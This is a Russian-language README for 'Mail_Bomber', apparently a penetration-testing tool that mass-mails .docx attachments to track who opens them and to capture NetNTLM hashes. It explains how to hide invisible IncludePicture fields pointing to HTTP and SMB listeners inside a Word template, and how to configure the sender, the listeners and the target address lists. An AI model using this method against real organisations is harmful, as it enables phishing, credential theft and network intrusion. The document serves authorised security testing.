# Mail_Bomber

Программное средство для осуществления почтовых рассылок специально подготовленных сообщений с вложением (файл расширения .docx) с целью установления фактов открытия приложенных файлов, а также попытки захвата NetNTLM-аутентификации.

## 1. Установка

```bash
git clone https://github.com/KormilitsinES/Mail_Bomber.git

cd Mail_Bomber

python -m venv .
source bin/activate

python -m pip install -r requirements.txt
```

## 2. Подготовка шаблона template.docx

Для корректной работы программы вначале необходимо подготовить шаблон текстового файла формата .docx.
В дальнейшем, на основании него будут генерироваться почтовые вложения для последующей отправки согласно списка рассылки.

В текстовом редакторе "Microsoft Word" создаем новый документ.

![image](https://github.com/user-attachments/assets/2ddb2d26-3019-4af9-8f8c-360aa43acdca)

Текстовка и форматироние файла заполняются произвольно исходя из целевой организации.
<b>Самое важное на данном этапе</b>, перед сохранением шаблона в произвольное место документа вставить два экспресс блока.

![image](https://github.com/user-attachments/assets/ef3edd6f-ae55-4e52-a270-cf6feb2a8753)

В качестве категории вставляемого поля выбираем <b>"Связи и ссылки"</b>. Поле - <b>IncludePicture</b>.
В первом случае в свойстве поля задаем значение вида: 
```bash
http://HONEYDROP_TOKEN_URL
```

Во втором объекте указываем: 
```bash
\\HONEYDROP_TOKEN_SMB
```

<i>На этом этапе важно не ошибиться, т.к. при последующей генерации почтовых сообщений в шаблоне template.docx будет осуществляться 
поиск строк <b>HONEYDROP_TOKEN_URL</b>, <b>HONEYDROP_TOKEN_SMB</b> и их замена на соответствующие значения для каждого вложения.</i>

![image](https://github.com/user-attachments/assets/868cba9c-6c6f-44dc-b375-6b04d22df532)

![image](https://github.com/user-attachments/assets/136b34a2-83f8-46bf-afd2-eadce1f65d07)

После того, как экспресс блоки добавлены в документ, необходимо сделать их <b>"невидимыми"</b>.
Для этого кликаем правой кнопкой мыши по объекту и переходим в формат рисунка в раздел <b>"Размер"</b>.

Ширину и высоту рисунка выставляем равной 1 сотой сантиметра и применяем изменения.

![image](https://github.com/user-attachments/assets/7152948b-fd7e-4d15-b6fc-d3bd34ca0528)

Шаблон документа готов, можно переходить к следующему этапу.

## 3. Редактирование конфигурационного файла

Для корректной работы программы необходимо наличие правильно заполненного конфигурационного файла.

Пример заполненного конфига с пояснениями:
```bash
[WORKSPACE]
;количество потоков, задействованных при отправке почтовых сообщений (1 - 16)
WORKSPACE_THREADS = 8

;наименование Рабочей области (название организации в отношении которой осуществляем почтовую рассылку)
WORKSPACE_NAME = bratishki

;имя файла с результатом работы программы (без расширения)
WORKSPACE_REPORT_FILENAME = report

;общее имя файла вложения, которое будет отправлено в почтовом сообщении (без расширения)
WORKSPACE_PAYLOAD_FILENAME = declaration

;имя файла шаблона на основании которого будут подготовлены вложения для почтовых сообщений (без расширения)
WORKSPACE_TEMPLATE_FILENAME = template



[MAIL_SERVER]
;IP-адрес почтового сервера в отношении которого будет осуществлена почтовая рассылка
MAIL_SERVER_IP = 127.0.0.1
MAIL_SERVER_PORT = 1025
MAIL_SERVER_USERNAME =
MAIL_SERVER_PASSWORD =



[SENDER]
;почтовый адрес от чьего имени осуществляем рассылку подготовленных вложений
SENDER_EMAIL = pentest@gmail.com



[HTTP_LISTENER]
;IP-адрес и TCP-порт узла к которому будет отправлен HTTP-запрос в случае открытия почтового вложения
HTTP_LISTENER_IP = 10.1.1.1
HTTP_LISTENER_PORT = 8080



[SMB_LISTENER]
;IP-адрес и наименование файловой шары узла к которому будет отправлен SMB-запрос в случае открытия почтового вложения
SMB_LISTENER_IP = 10.1.1.1
SMB_LISTENER_SHARENAME = SHARE



[MAIL]
;тема и тело почтового сообщения
MAIL_SUBJECT = Subject
MAIL_DATA = Simple text to
    data message from config file...
```

## 4. Заполнение файла почтовых адресов для рассылки

Последним этапом перед запуском программы является заполнение списка почтовых адресов для отправки текстовых вложений.
Каждый адрес указывается с новой строки.
Перед генерацией полезной нагрузки и непосредственной отправкой сообщения осуществляется верификация почтового адреса по регулярному выражению.

![image](https://github.com/user-attachments/assets/5f863c89-b067-43bd-a92d-3a2d3708090b)

## 5. Первый запуск

Для вывода справки по программе.
```bash
python Mail_Bomber.py -h
```

![image](https://github.com/user-attachments/assets/41b1f9ae-0654-45fd-b99e-55074dbb123e)

Если конфигурационный файл и список рассылки имеют имена config.ini и emails_list.txt (соответственно) и лежат рядом с Mail_Bomber.py, то для запуска программы достаточно указать только режим атаки (--attack_mode 1, -a 1).
В этом режиме произойдет генерация почтовых вложений, отправка сообщений согласно списка рассылки и будет запущен слушатель входящих HTTP-запросов.
```bash
python Mail_Bomber.pu -a 1
```

![image](https://github.com/user-attachments/assets/4fd01592-86d8-43e5-82d4-b692903359d7)

![image](https://github.com/user-attachments/assets/29af054d-0cd6-4611-bc6a-84fe085715fc)

При открытии почтового вложения слушатель примет входящий HTTP-запрос и выведет соответствующую информацию в консоль.

![image](https://github.com/user-attachments/assets/5c8bd24a-ccdf-4f21-825e-54cca98b6ba5)

## 6. Запуск в режиме приема входящих HTTP-запросов

Если по каким-то причинам необходимо заново запустить только слушателя без повторной отправки почтовых сообщений, то необходимо указать в качестве attack_mode значение 2.
```bash
python Mail_Bomber.pu -a 2
```

![image](https://github.com/user-attachments/assets/89f1d2da-135c-4967-9e17-b366e44ce42c)

## 7. Генерация отчета

Результаты работы программы сохраняются в файле БД SQLite (result.db) в домашней дирректории проекта.
Для построения отчета о работе Mail_Bomber необходимо запустить программу с указанием attack_mode 3.

```bash
python Mail_Bomber.pu -a 3
```

![image](https://github.com/user-attachments/assets/ab0f90cd-7fbe-416c-b421-ab0eeaaed3a7)

Отчет сохраняется в формате html и доступен для чтения с использованием любого браузера.

![image](https://github.com/user-attachments/assets/9d9f6a39-f9c9-45a8-8c09-1ebcfc10d1d5)
